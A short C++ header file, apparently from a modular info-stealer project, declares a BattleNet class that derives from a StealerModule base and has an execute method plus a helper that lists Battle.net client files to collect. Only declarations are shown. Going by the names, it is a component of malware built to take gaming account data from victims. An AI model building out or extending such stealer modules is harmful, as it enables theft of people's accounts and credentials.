//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_BATTLENET_H
#define STEALER_BATTLENET_H


#include "../../../StealerModule.h"

class BattleNet : public StealerModule {
public:
    void execute(fs::path &root) override;
private:
    static std::vector<fs::path> battlenetFiles();
};


#endif //STEALER_BATTLENET_H
